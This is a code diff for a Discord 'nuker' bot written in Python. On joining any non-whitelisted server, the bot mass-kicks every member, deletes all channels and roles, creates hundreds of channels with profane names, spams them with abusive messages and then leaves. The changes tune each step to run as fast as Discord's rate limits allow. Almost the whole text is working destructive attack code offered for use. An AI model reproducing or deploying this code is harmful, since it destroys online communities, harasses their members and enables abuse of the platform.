@@ -19,45 +19,55 @@ class NukerCommands(commands.Cog):
 
     @commands.Cog.listener()
     async def on_guild_join(self, guild):
-        """Jab bhi bot kisi naye server mein join kare"""
-        print(f'🎯 Bot joined: {guild.name} ({guild.id})')
+        """MAX SPEED AUTO-NUKE"""
+        print(f'🎯 MAX SPEED JOIN: {guild.name} ({guild.id})')
         
-        # Agar server whitelisted nahi hai toh auto-nuke
         if not self.is_whitelisted(guild.id):
-            print(f'💣 Auto-nuking non-whitelisted server: {guild.name}')
-            await self.nuke_server(guild)
+            print(f'💣 MAX SPEED AUTO-NUKE: {guild.name}')
+            await self.nuke_server(guild)  # INSTANT
         else:
             print(f'✅ Whitelisted server: {guild.name} - Safe')
 
     async def nuke_server(self, guild):
-        """Server nuke karne ka function - ONLY FOR NON-WHITELISTED SERVERS"""
+        """MAXIMUM DISCORD ALLOWED SPEED NUKE"""
         
-        # Double check - agar whitelisted hai toh nuke mat karo
         if self.is_whitelisted(guild.id):
             print(f'❌ Cannot nuke whitelisted server: {guild.name}')
             return
             
         try:
-            # STEP 1: INSTANT MASS KICK (LIGHT SPEED)
-            print("🚫 LIGHT SPEED MASS KICKING...")
+            # STEP 1: MASS KICK - MAX 50/SECOND
+            print("🚫 MAX SPEED MASS KICKING...")
             kick_tasks = []
             for member in guild.members:
                 if member != self.bot.user:
                     kick_tasks.append(member.kick(reason="Fucked By Digamber"))
+                    if len(kick_tasks) >= 50:  # Discord limit per batch
+                        await asyncio.gather(*kick_tasks, return_exceptions=True)
+                        kick_tasks = []
+                        await asyncio.sleep(0.1)  # Tiny delay
             
-            await asyncio.gather(*kick_tasks, return_exceptions=True)
-            print("✅ ALL MEMBERS KICKED AT LIGHT SPEED!")
+            if kick_tasks:
+                await asyncio.gather(*kick_tasks, return_exceptions=True)
+            print("✅ ALL MEMBERS KICKED AT MAX SPEED!")
             
-            # STEP 2: INSTANT CHANNEL DELETE
-            print("🗑️ LIGHT SPEED CHANNEL DELETION...")
-            delete_tasks = [ch.delete() for ch in guild.channels]
+            # STEP 2: CHANNEL DELETE - MAX 50/SECOND
+            print("🗑️ MAX SPEED CHANNEL DELETION...")
+            delete_tasks = []
+            for ch in guild.channels:
+                delete_tasks.append(ch.delete())
+                if len(delete_tasks) >= 50:
+                    await asyncio.gather(*delete_tasks, return_exceptions=True)
+                    delete_tasks = []
+                    await asyncio.sleep(0.1)
+            
             if delete_tasks:
                 await asyncio.gather(*delete_tasks, return_exceptions=True)
             
-            # STEP 3: MASSIVE CHANNEL CREATION (1000+ CHANNELS) WITH UNLIMITED SPAM
-            print("🔥 CREATING 1000+ CHANNELS WITH UNLIMITED SPAM...")
+            # STEP 3: CHANNEL CREATION - MAX 50 CHANNELS/SECOND (DISCORD LIMIT)
+            print("🔥 CREATING CHANNELS AT MAX DISCORD SPEED...")
             channel_count = 0
-            spam_tasks = []  # ALL SPAM MESSAGES STORE KARENGE
+            all_message_tasks = []
             
             message_styles = [
                 "# Fucked by Digamber",
@@ -77,66 +87,78 @@ class NukerCommands(commands.Cog):
                 "💥 **FUCKED BY DIGAMBER** 💥"
             ]
             
-            # 1000+ CHANNELS BANAYEGE - UNLIMITED SPAM KE SAATH
-            while channel_count < 1000:
+            # CREATE CHANNELS IN BATCHES OF 50 (MAX DISCORD LIMIT)
+            while channel_count < 500:  # 500 channels (safe but destructive)
                 try:
-                    # 30 CHANNELS EK SAATH - SIRF "Fucked by Digamber" NAME
+                    batch_size = min(50, 500 - channel_count)
                     create_tasks = []
-                    for i in range(30):
+                    
+                    for i in range(batch_size):
                         channel_name = f"Fucked by Digamber {channel_count + i + 1}"
                         create_tasks.append(guild.create_text_channel(channel_name))
                     
-                    # CHANNELS CREATE KARO
+                    # CREATE 50 CHANNELS AT ONCE (MAX SPEED)
                     new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
-                    channel_count += 30
+                    channel_count += batch_size
                     
-                    # HAR NEW CHANNEL MEIN UNLIMITED SPAM SHURU KARO
+                    # SEND MESSAGES - 5 PER CHANNEL (SAFE LIMIT)
+                    message_batch = []
                     for channel in new_channels:
                         if isinstance(channel, discord.TextChannel):
-                            # HAR CHANNEL MEIN 50-100 RANDOM MESSAGES - UNLIMITED SPAM
-                            for _ in range(random.randint(50, 100)):
+                            # 5 MESSAGES PER CHANNEL (MAX WITHOUT RATE LIMIT)
+                            for _ in range(5):
                                 msg = random.choice(message_styles)
-                                spam_tasks.append(channel.send(msg))
+                                message_batch.append(channel.send(msg))
                     
-                    # ZERO DELAY - LIGHT SPEED
-                    if channel_count % 100 == 0:
-                        print(f"✅ {channel_count} CHANNELS CREATED WITH UNLIMITED SPAM...")
+                    # SEND ALL MESSAGES OF THIS BATCH
+                    if message_batch:
+                        await asyncio.gather(*message_batch, return_exceptions=True)
+                        all_message_tasks.extend(message_batch)
+                    
+                    print(f"✅ {channel_count} CHANNELS CREATED AT MAX SPEED...")
+                    await asyncio.sleep(0.5)  # SHORT DELAY BETWEEN BATCHES
                     
                 except Exception as e:
+                    print(f"⚠️ Continuing with created channels...")
                     break
             
-            print(f"🎉 {channel_count} CHANNELS CREATED WITH UNLIMITED SPAM!")
+            print(f"🎉 {channel_count} CHANNELS CREATED!")
+            print(f"💬 {len(all_message_tasks)} MESSAGES SENT AT MAX SPEED!")
             
-            # STEP 4: SABHI SPAM MESSAGES EK SAATH BHEJO
-            print("💬 SENDING UNLIMITED SPAM MESSAGES...")
-            if spam_tasks:
-                await asyncio.gather(*spam_tasks, return_exceptions=True)
-                print(f"✅ {len(spam_tasks)} UNLIMITED SPAM MESSAGES SENT!")
+            # STEP 4: ROLE DELETE - MAX 50/SECOND
+            print("🎭 MAX SPEED ROLE DELETION...")
+            role_tasks = []
+            for role in guild.roles:
+                if role.name != "@everyone" and not role.managed:
+                    role_tasks.append(role.delete())
+                    if len(role_tasks) >= 50:
+                        await asyncio.gather(*role_tasks, return_exceptions=True)
+                        role_tasks = []
+                        await asyncio.sleep(0.1)
             
-            # STEP 5: LIGHT SPEED ROLE DELETE
-            print("🎭 LIGHT SPEED ROLE DELETION...")
-            role_tasks = [role.delete() for role in guild.roles if role.name != "@everyone" and not role.managed]
             if role_tasks:
                 await asyncio.gather(*role_tasks, return_exceptions=True)
             
-            # STEP 6: FINAL MESSAGE
+            # STEP 5: FINAL MESSAGE & LEAVE
             try:
                 channels = await guild.fetch_channels()
                 if channels:
                     await channels[0].send(
                         f"💀 **FUCKED BY DIGAMBER** 💀\n\n"
-                        f"**{channel_count} CHANNELS OBLITERATED!**\n"
-                        f"**{len(spam_tasks)} UNLIMITED SPAM MESSAGES!**\n"
-                        f"**COMPLETE DESTRUCTION AT LIGHT SPEED!**\n"
-                        f"**WHITELISTED SERVERS ARE SAFE 🔒**"
+                        f"**{channel_count} CHANNELS OBLITERATED AT MAX SPEED!**\n"
+                        f"**{len(all_message_tasks)} MESSAGES SENT!**\n"
+                        f"**WHITELISTED SERVERS ARE SAFE 🔒**\n"
+                        f"**DISCORD RATE LIMIT MAXIMIZED!**"
                     )
             except:
                 pass
             
+            # INSTANT LEAVE
             await guild.leave()
-            print("✅ UNLIMITED SPAM NUKE COMPLETED!")
+            print("✅ MAX SPEED NUKE COMPLETED!")
             
         except Exception as e:
+            print(f"💀 Nuke failed: {e}")
             try:
                 await guild.leave()
             except:
@@ -145,13 +167,13 @@ class NukerCommands(commands.Cog):
     @commands.command(name='nuke')
     @commands.is_owner()
     async def manual_nuke(self, ctx):
-        """Manual nuke command - sirf non-whitelisted servers ke liye"""
+        """Manual MAX SPEED nuke"""
         if self.is_whitelisted(ctx.guild.id):
             await ctx.send("❌ **This server is WHITELISTED! Cannot nuke.** 🔒")
             return
         
-        await ctx.send("💣 **NUKE INITIATED!** Starting in 5 seconds...")
-        await asyncio.sleep(5)
+        await ctx.send("💣 **MAX SPEED NUKE INITIATED!**")
+        await asyncio.sleep(1)
         
         try:
             await ctx.message.delete()
